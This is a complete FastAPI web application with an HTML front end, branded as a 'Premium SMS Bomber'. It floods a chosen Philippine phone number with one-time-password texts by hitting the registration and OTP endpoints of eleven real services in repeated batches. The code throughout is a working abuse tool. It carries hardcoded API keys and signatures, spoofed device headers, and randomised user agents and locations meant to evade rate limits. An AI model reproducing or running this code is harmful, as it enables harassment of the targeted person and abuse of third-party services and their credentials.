from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import asyncio
import aiohttp
import random
import string
import time
import os
from typing import List, Dict, Any
from asyncio_throttle import Throttler

# Initialize FastAPI
app = FastAPI()

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Store active attacks
active_attacks = {}

class BombRequest(BaseModel):
    phone: str
    amount: int = 100

class SMSBomber:
    def __init__(self):
        self.success_count = 0
        self.fail_count = 0
        self.throttler = Throttler(rate_limit=10, period=1)
        self.is_running = False
    
    def random_string(self, length):
        chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
        return ''.join(random.choice(chars) for _ in range(length))
    
    def normalize_phone_number(self, phone):
        phone = phone.replace(' ', '').replace('-', '')
        
        if phone.startswith('0'):
            return '+63' + phone[1:]
        elif phone.startswith('63') and not phone.startswith('+63'):
            return '+' + phone
        elif not phone.startswith('+63') and len(phone) == 10:
            return '+63' + phone
        elif not phone.startswith('+'):
            return '+63' + phone
        
        return phone
    
    def format_number(self, number):
        if number.startswith('+63'):
            return number
        elif number.startswith('09'):
            return '+63' + number[2:]
        elif number.startswith('9'):
            return '+63' + number
        return number
    
    def validate_number(self, number):
        clean_number = number.replace(' ', '')
        import re
        patterns = [
            r'^09\d{9}$',
            r'^9\d{9}$', 
            r'^\+639\d{9}$'
        ]
        for pattern in patterns:
            if re.match(pattern, clean_number):
                return True
        return False
    
    async def send_request(self, session, method, url, headers=None, data=None, json_data=None, timeout=10):
        try:
            async with self.throttler:
                if method.upper() == 'POST':
                    if json_data:
                        async with session.post(url, headers=headers, json=json_data, timeout=timeout) as response:
                            return response.status in [200, 201, 202]
                    else:
                        async with session.post(url, headers=headers, data=data, timeout=timeout) as response:
                            return response.status in [200, 201, 202]
                else:
                    async with session.get(url, headers=headers, timeout=timeout) as response:
                        return response.status == 200
        except Exception:
            return False
    
    async def send_ezloan(self, session, number_to_send):
        headers = {
            'User-Agent': 'okhttp/4.9.2',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'accept-language': 'en',
            'imei': 'e933e51d8c994b05b5a0d523c84f8287',
            'device': 'android',
            'buildtype': 'release',
            'brand': 'POCO',
            'model': '2207117BPG',
            'manufacturer': 'Xiaomi',
            'source': 'EZLOAN',
            'channel': 'GooglePlay_Blue',
            'appversion': '2.0.4',
            'appversioncode': '2000402',
            'version': '2.0.4',
            'versioncode': '2000401',
            'sysversion': '15',
            'sysversioncode': '35',
            'customerid': '',
            'businessid': 'EZLOAN',
            'phone': '',
            'appid': 'EZLOAN',
            'authorization': '',
            'blackbox': 'qGPG61760445001tnR5bweVKGe'
        }
        
        json_data = {
            "businessId": "EZLOAN",
            "contactNumber": number_to_send,
            "appsflyerIdentifier": "1760444943092-3966994042140191452"
        }
        
        success = await self.send_request(session, 'POST', 
                                        'https://gateway.ezloancash.ph/security/auth/otp/request',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.success_count += 1
        return success
    
    async def send_xpress(self, session, number_to_send, i):
        formatted_num = self.format_number(number_to_send)
        
        json_data = {
            "FirstName": "user",
            "LastName": "test",
            "Email": f"user{int(time.time())}_{i}@gmail.com",
            "Phone": formatted_num,
            "Password": "Pass1234",
            "ConfirmPassword": "Pass1234",
            "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
            "FingerprintRequestId": "1757149666261.Rr1VvG",
        }
        
        headers = {
            "User-Agent": "Dalvik/2.1.0",
            "Content-Type": "application/json",
        }
        
        success = await self.send_request(session, 'POST',
                                        "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                                        headers=headers, json_data=json_data)
        
        if success:
            self.success_count += 1
        return success
    
    async def send_abenson(self, session, number_to_send):
        data = f"contact_no={number_to_send}&login_token=undefined"
        
        headers = {
            'User-Agent': 'okhttp/4.9.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                                        headers=headers, data=data)
        
        if success:
            self.success_count += 1
        return success
    
    async def send_excellent_lending(self, session, number_to_send):
        coordinates = [
            {'lat': '14.5995', 'long': '120.9842'},
            {'lat': '14.6760', 'long': '121.0437'},
            {'lat': '14.8648', 'long': '121.0418'}
        ]
        user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
        
        coord = random.choice(coordinates)
        agent = random.choice(user_agents)
        
        json_data = {
            "domain": number_to_send,
            "cat": "login",
            "previous": False,
            "financial": "efe35521e51f924efcad5d61d61072a9"
        }
        
        headers = {
            'User-Agent': agent,
            'Content-Type': 'application/json; charset=utf-8',
            'x-latitude': coord['lat'],
            'x-longitude': coord['long']
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.success_count += 1
        return success
    
    async def send_fortune_pay(self, session, number_to_send):
        json_data = {
            "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
            "deviceType": 'GOOGLE_PLAY',
            "companyId": '4bf735e97269421a80b82359e7dc2288',
            "dialCode": '+63',
            "phoneNumber": number_to_send.replace('+63', '').lstrip('0')
        }
        
        headers = {
            'User-Agent': 'Dart/3.6 (dart:io)',
            'Content-Type': 'application/json',
            'app-type': 'GOOGLE_PLAY',
            'authorization': 'Bearer',
            'app-version': '4.3.5',
            'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
            'timestamp': str(int(time.time() * 1000)),
            'nonce': f"{self.random_string(10)}-{int(time.time() * 1000)}"
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.success_count += 1
        return success
    
    async def send_wemove(self, session, number_to_send):
        json_data = {
            "phone_country": '+63',
            "phone_no": number_to_send.replace('+63', '').lstrip('0')
        }
        
        headers = {
            'User-Agent': 'okhttp/4.9.3',
            'Content-Type': 'application/json',
            'xuid_type': 'user',
            'source': 'customer',
            'authorization': 'Bearer'
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.wemove.com.ph/auth/users',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.success_count += 1
        return success
    
    async def send_lbc(self, session, number_to_send):
        data = {
            "verification_type": 'mobile',
            "client_email": f"{self.random_string(8)}@gmail.com",
            "client_contact_code": '+63',
            "client_contact_no": number_to_send.replace('+63', '').lstrip('0'),
            "app_log_uid": self.random_string(16),
        }
        
        form_data = "&".join([f"{k}={v}" for k, v in data.items()])
        
        headers = {
            'User-Agent': 'Dart/2.19 (dart:io)',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                                        headers=headers, data=form_data)
        
        if success:
            self.success_count += 1
        return success
    
    async def send_pickup_coffee(self, session, number_to_send):
        user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
        formatted_num = self.format_number(number_to_send)
        
        json_data = {
            "mobile_number": formatted_num,
            "login_method": 'mobile_number'
        }
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Content-Type': 'application/json',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://production.api.pickup-coffee.net/v2/customers/login',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.success_count += 1
        return success
    
    async def send_honey_loan(self, session, number_to_send):
        json_data = {
            "phone": number_to_send,
            "is_rights_block_accepted": 1
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
            'Content-Type': 'application/json',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.honeyloan.ph/api/client/registration/step-one',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.success_count += 1
        return success
    
    async def send_komo_ph(self, session, number_to_send):
        json_data = {
            "mobile": number_to_send,
            "transactionType": 6
        }
        
        headers = {
            'Content-Type': 'application/json',
            'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
            'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.komo.ph/api/otp/v5/generate',
                                        headers=headers, json_data=json_data)
        
        if success:
            self.success_count += 1
        return success
    
    async def send_s5_otp(self, session, number_to_send):
        try:
            normalized_phone = self.normalize_phone_number(number_to_send)
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary4wi4VH3ZsWtBXCct',
                'origin': 'https://www.s5.com',
                'referer': 'https://www.s5.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
                'x-api-type': 'external',
                'x-locale': 'en',
                'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
                'x-timezone-offset': '480'
            }

            body = f"------WebKitFormBoundary4wi4VH3ZsWtBXCct\r\nContent-Disposition: form-data; name=\"phone_number\"\r\n\r\n{normalized_phone}\r\n------WebKitFormBoundary4wi4VH3ZsWtBXCct--\r\n"

            success = await self.send_request(session, 'POST',
                                            'https://api.s5.com/player/api/v1/otp/request',
                                            headers=headers, data=body)
            
            if success:
                self.success_count += 1
            return success
        except Exception:
            return False
    
    async def execute_attack(self, number_to_send, amount, session_id: str):
        self.is_running = True
        self.success_count = 0
        self.fail_count = 0
        
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for i in range(1, amount + 1):
                if not self.is_running:
                    break
                
                tasks = [
                    self.send_ezloan(session, number_to_send),
                    self.send_xpress(session, number_to_send, i),
                    self.send_abenson(session, number_to_send),
                    self.send_excellent_lending(session, number_to_send),
                    self.send_fortune_pay(session, number_to_send),
                    self.send_wemove(session, number_to_send),
                    self.send_lbc(session, number_to_send),
                    self.send_pickup_coffee(session, number_to_send),
                    self.send_honey_loan(session, number_to_send),
                    self.send_komo_ph(session, number_to_send),
                    self.send_s5_otp(session, number_to_send),
                ]
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                successful = sum(1 for result in results if result is True)
                self.fail_count = len(tasks) - successful
                
                # Update attack status
                if session_id in active_attacks:
                    active_attacks[session_id] = {
                        'current_batch': i,
                        'total_batches': amount,
                        'success': self.success_count,
                        'failed': self.fail_count,
                        'is_running': True
                    }
                
                delay = random.uniform(1, 3)
                await asyncio.sleep(delay)
        
        self.is_running = False
        if session_id in active_attacks:
            active_attacks[session_id]['is_running'] = False
    
    def stop_attack(self):
        self.is_running = False
    
    def get_stats(self):
        return {
            'success': self.success_count,
            'failed': self.fail_count,
            'total': self.success_count + self.fail_count
        }

# Store bomber instances
bombers = {}

@app.get("/")
async def root():
    """Serve the main HTML page"""
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
        <title>XKYROSC - Premium SMS Bomber</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                -webkit-tap-highlight-color: transparent;
            }
            
            body {
                background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 16px;
            }
            
            .container {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                border-radius: 24px;
                padding: 24px;
                max-width: 500px;
                width: 100%;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
            
            .header {
                text-align: center;
                margin-bottom: 32px;
            }
            
            .logo {
                font-size: 48px;
                font-weight: bold;
                background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                letter-spacing: 2px;
            }
            
            .subtitle {
                color: rgba(255, 255, 255, 0.7);
                font-size: 14px;
                margin-top: 8px;
            }
            
            .input-group {
                margin-bottom: 20px;
            }
            
            .input-label {
                display: block;
                color: white;
                margin-bottom: 8px;
                font-size: 14px;
                font-weight: 500;
            }
            
            .input-field {
                width: 100%;
                padding: 14px 16px;
                background: rgba(255, 255, 255, 0.95);
                border: none;
                border-radius: 12px;
                font-size: 16px;
                transition: all 0.3s ease;
            }
            
            .input-field:focus {
                outline: none;
                transform: scale(1.02);
                box-shadow: 0 0 0 3px rgba(78, 205, 196, 0.3);
            }
            
            .input-field:disabled {
                opacity: 0.5;
                cursor: not-allowed;
            }
            
            .btn {
                width: 100%;
                padding: 14px;
                border: none;
                border-radius: 12px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s ease;
                margin-bottom: 12px;
            }
            
            .btn-primary {
                background: linear-gradient(135deg, #ff6b6b, #ee5a24);
                color: white;
            }
            
            .btn-primary:active {
                transform: scale(0.98);
            }
            
            .btn-primary:disabled {
                opacity: 0.5;
                cursor: not-allowed;
                transform: none;
            }
            
            .btn-secondary {
                background: rgba(255, 255, 255, 0.2);
                color: white;
                border: 1px solid rgba(255, 255, 255, 0.3);
            }
            
            .btn-secondary:active {
                transform: scale(0.98);
            }
            
            .stats {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 12px;
                margin: 24px 0;
            }
            
            .stat-card {
                background: rgba(0, 0, 0, 0.3);
                border-radius: 12px;
                padding: 12px;
                text-align: center;
            }
            
            .stat-value {
                font-size: 24px;
                font-weight: bold;
                color: #4ecdc4;
            }
            
            .stat-label {
                font-size: 12px;
                color: rgba(255, 255, 255, 0.7);
                margin-top: 4px;
            }
            
            .progress-container {
                margin: 20px 0;
                display: none;
            }
            
            .progress-bar {
                width: 100%;
                height: 8px;
                background: rgba(255, 255, 255, 0.2);
                border-radius: 4px;
                overflow: hidden;
            }
            
            .progress-fill {
                height: 100%;
                background: linear-gradient(90deg, #4ecdc4, #ff6b6b);
                width: 0%;
                transition: width 0.3s ease;
                border-radius: 4px;
            }
            
            .progress-text {
                text-align: center;
                color: white;
                font-size: 12px;
                margin-top: 8px;
            }
            
            .log-area {
                background: rgba(0, 0, 0, 0.5);
                border-radius: 12px;
                padding: 12px;
                height: 200px;
                overflow-y: auto;
                font-family: 'Courier New', monospace;
                font-size: 11px;
                margin-top: 20px;
            }
            
            .log-entry {
                color: rgba(255, 255, 255, 0.8);
                padding: 4px 0;
                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            }
            
            .log-success {
                color: #4ecdc4;
            }
            
            .log-error {
                color: #ff6b6b;
            }
            
            .warning {
                background: rgba(255, 193, 7, 0.2);
                border-left: 3px solid #ffc107;
                padding: 12px;
                border-radius: 8px;
                margin: 16px 0;
                font-size: 12px;
                color: #ffc107;
            }
            
            ::-webkit-scrollbar {
                width: 6px;
            }
            
            ::-webkit-scrollbar-track {
                background: rgba(255, 255, 255, 0.1);
                border-radius: 3px;
            }
            
            ::-webkit-scrollbar-thumb {
                background: rgba(255, 255, 255, 0.3);
                border-radius: 3px;
            }
            
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }
            
            .status-badge {
                display: inline-block;
                width: 8px;
                height: 8px;
                border-radius: 50%;
                background: #4ecdc4;
                animation: pulse 2s infinite;
                margin-right: 8px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">🔥 XKYROSC</div>
                <div class="subtitle">Premium SMS Bombing Tool</div>
            </div>
            
            <div class="input-group">
                <label class="input-label">📱 Target Phone Number</label>
                <input type="tel" id="phone" class="input-field" placeholder="09123456789 or 9123456789" autocomplete="off">
            </div>
            
            <div class="input-group">
                <label class="input-label">🔢 Number of Batches (Max 500)</label>
                <input type="number" id="amount" class="input-field" value="50" min="1" max="500">
            </div>
            
            <div class="warning">
                ⚠️ Warning: Use responsibly. Each batch sends ~11 SMS. Keep batches reasonable (50-100) to avoid rate limiting.
            </div>
            
            <button id="startBtn" class="btn btn-primary" onclick="startAttack()">💣 START BOMBING</button>
            <button id="stopBtn" class="btn btn-secondary" onclick="stopAttack()" style="display:none;">🛑 STOP ATTACK</button>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-value" id="successCount">0</div>
                    <div class="stat-label">Successful</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="failCount">0</div>
                    <div class="stat-label">Failed</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="totalCount">0</div>
                    <div class="stat-label">Total Sent</div>
                </div>
            </div>
            
            <div class="progress-container" id="progressContainer">
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="progress-text" id="progressText">0%</div>
            </div>
            
            <div class="log-area" id="logArea">
                <div class="log-entry">✨ XKYROSC SMS Bomber Ready</div>
                <div class="log-entry">📡 Status: Online</div>
                <div class="log-entry">💡 Enter target number and start bombing</div>
            </div>
        </div>
        
        <script>
            let sessionId = null;
            let statusCheckInterval = null;
            
            function addLog(message, type = 'info') {
                const logArea = document.getElementById('logArea');
                const logEntry = document.createElement('div');
                logEntry.className = 'log-entry';
                if (type === 'success') logEntry.classList.add('log-success');
                if (type === 'error') logEntry.classList.add('log-error');
                
                const timestamp = new Date().toLocaleTimeString();
                logEntry.innerHTML = `[${timestamp}] ${message}`;
                logArea.appendChild(logEntry);
                logEntry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            }
            
            async function startAttack() {
                const phone = document.getElementById('phone').value.trim();
                const amount = parseInt(document.getElementById('amount').value);
                
                if (!phone) {
                    addLog('❌ Please enter a phone number', 'error');
                    return;
                }
                
                if (!phone.match(/^(09|9|\+639)\d{9}$/)) {
                    addLog('❌ Invalid phone number! Use format: 09123456789', 'error');
                    return;
                }
                
                if (amount < 1 || amount > 500) {
                    addLog('❌ Batches must be between 1 and 500', 'error');
                    return;
                }
                
                // Update UI
                document.getElementById('startBtn').disabled = true;
                document.getElementById('startBtn').style.display = 'none';
                document.getElementById('stopBtn').style.display = 'block';
                document.getElementById('phone').disabled = true;
                document.getElementById('amount').disabled = true;
                document.getElementById('progressContainer').style.display = 'block';
                
                addLog(`🎯 Target: ${phone}`, 'success');
                addLog(`📊 Batches: ${amount} (Approx ${amount * 11} SMS)`, 'info');
                addLog(`💣 Starting attack...`, 'info');
                
                try {
                    const response = await fetch('/api/start', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phone: phone, amount: amount })
                    });
                    
                    const data = await response.json();
                    sessionId = data.session_id;
                    addLog(`✅ Attack started! Session ID: ${sessionId.substring(0, 8)}...`, 'success');
                    
                    // Start checking status
                    statusCheckInterval = setInterval(checkStatus, 2000);
                    
                } catch (error) {
                    addLog(`❌ Error: ${error.message}`, 'error');
                    resetUI();
                }
            }
            
            async function stopAttack() {
                if (!sessionId) return;
                
                addLog(`🛑 Stopping attack...`, 'warning');
                
                try {
                    await fetch(`/api/stop/${sessionId}`, { method: 'POST' });
                    addLog(`✅ Attack stopped by user`, 'success');
                } catch (error) {
                    addLog(`❌ Error stopping: ${error.message}`, 'error');
                }
                
                if (statusCheckInterval) clearInterval(statusCheckInterval);
                resetUI();
            }
            
            async function checkStatus() {
                if (!sessionId) return;
                
                try {
                    const response = await fetch(`/api/status/${sessionId}`);
                    const status = await response.json();
                    
                    // Update stats
                    document.getElementById('successCount').innerText = status.success;
                    document.getElementById('failCount').innerText = status.failed;
                    document.getElementById('totalCount').innerText = status.success + status.failed;
                    
                    // Update progress
                    const progress = (status.current_batch / status.total_batches) * 100;
                    document.getElementById('progressFill').style.width = progress + '%';
                    document.getElementById('progressText').innerHTML = `Batch ${status.current_batch}/${status.total_batches} - ${Math.round(progress)}%`;
                    
                    if (!status.is_running && status.current_batch === status.total_batches) {
                        addLog(`✨ Attack completed! Success: ${status.success}, Failed: ${status.failed}`, 'success');
                        if (statusCheckInterval) clearInterval(statusCheckInterval);
                        resetUI();
                    } else if (!status.is_running && status.current_batch < status.total_batches) {
                        addLog(`⚠️ Attack stopped early`, 'warning');
                        if (statusCheckInterval) clearInterval(statusCheckInterval);
                        resetUI();
                    }
                    
                } catch (error) {
                    console.error('Status check error:', error);
                }
            }
            
            function resetUI() {
                document.getElementById('startBtn').disabled = false;
                document.getElementById('startBtn').style.display = 'block';
                document.getElementById('stopBtn').style.display = 'none';
                document.getElementById('phone').disabled = false;
                document.getElementById('amount').disabled = false;
                document.getElementById('progressContainer').style.display = 'none';
                sessionId = null;
                if (statusCheckInterval) clearInterval(statusCheckInterval);
            }
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.post("/api/start")
async def start_bomb(request: BombRequest):
    """Start a new bombing attack"""
    bomber = SMSBomber()
    session_id = f"{int(time.time())}_{random.randint(1000, 9999)}"
    
    # Store bomber instance
    bombers[session_id] = bomber
    
    # Run attack in background
    asyncio.create_task(run_attack_background(session_id, bomber, request.phone, request.amount))
    
    return JSONResponse({
        "status": "started",
        "session_id": session_id,
        "phone": request.phone,
        "amount": request.amount
    })

@app.post("/api/stop/{session_id}")
async def stop_bomb(session_id: str):
    """Stop an ongoing attack"""
    if session_id in bombers:
        bombers[session_id].stop_attack()
        return JSONResponse({"status": "stopped", "session_id": session_id})
    return JSONResponse({"status": "not_found"}, status_code=404)

@app.get("/api/status/{session_id}")
async def get_status(session_id: str):
    """Get attack status"""
    if session_id in bombers:
        bomber = bombers[session_id]
        stats = bomber.get_stats()
        
        # Get progress from active_attacks
        if session_id in active_attacks:
            progress = active_attacks[session_id]
            return JSONResponse({
                "is_running": bomber.is_running,
                "success": stats['success'],
                "failed": stats['failed'],
                "total": stats['total'],
                "current_batch": progress.get('current_batch', 0),
                "total_batches": progress.get('total_batches', 0)
            })
        else:
            return JSONResponse({
                "is_running": bomber.is_running,
                "success": stats['success'],
                "failed": stats['failed'],
                "total": stats['total'],
                "current_batch": 0,
                "total_batches": 0
            })
    
    return JSONResponse({"error": "Session not found"}, status_code=404)

async def run_attack_background(session_id: str, bomber: SMSBomber, phone: str, amount: int):
    """Background task to run the attack"""
    active_attacks[session_id] = {
        'current_batch': 0,
        'total_batches': amount,
        'is_running': True
    }
    
    await bomber.execute_attack(phone, amount, session_id)
    
    # Cleanup after attack completes
    await asyncio.sleep(5)  # Give time for status checks
    if session_id in bombers:
        del bombers[session_id]
    if session_id in active_attacks:
        del active_attacks[session_id]
